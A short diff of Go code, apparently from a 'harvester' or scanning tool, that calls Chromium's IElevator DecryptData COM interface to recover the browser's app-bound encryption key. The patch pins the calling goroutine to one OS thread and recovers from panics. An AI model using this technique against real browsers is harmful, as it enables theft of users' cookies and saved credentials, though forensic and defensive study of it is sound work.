@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"syscall"
 	"unsafe"
@@ -153,7 +154,23 @@ func getChromiumAppBoundKey(profileDir, browserName string) ([]byte, error) {
 // vtable slot 5, and return the plaintext bytes. The CoInitialize* calls
 // tolerate already-initialized state so calling this multiple times in one
 // process is safe.
-func callIElevatorDecryptData(clsid, iid *windows.GUID, blob []byte) ([]byte, error) {
+//
+// A goroutine can be moved between OS threads at any scheduler point, but
+// COM apartments are strictly thread-bound: all calls on a proxy must
+// happen on the same OS thread that ran CoInitializeEx for that apartment.
+// We pin the goroutine for the entire function to avoid the dreaded
+// access violation deep inside rpcrt4.dll when the marshaler finds itself
+// on the wrong thread. Recover as a belt-and-braces because a crash in
+// the RPC runtime must not take down the whole scan.
+func callIElevatorDecryptData(clsid, iid *windows.GUID, blob []byte) (out []byte, err error) {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+	defer func() {
+		if r := recover(); r != nil {
+			err = fmt.Errorf("panic in IElevator call: %v", r)
+		}
+	}()
+
 	// 1. Initialize COM on this thread (apartment-threaded). Tolerate
 	//    "already initialized in another mode" because the harvester
 	//    might run alongside other COM code in the future.
@@ -263,7 +280,7 @@ func callIElevatorDecryptData(clsid, iid *windows.GUID, blob []byte) ([]byte, er
 	if n == 0 {
 		return nil, fmt.Errorf("IElevator::DecryptData returned an empty BSTR")
 	}
-	out := make([]byte, n)
+	out = make([]byte, n)
 	copy(out, unsafe.Slice((*byte)(unsafe.Pointer(bstrOut)), n))
 	return out, nil
 }
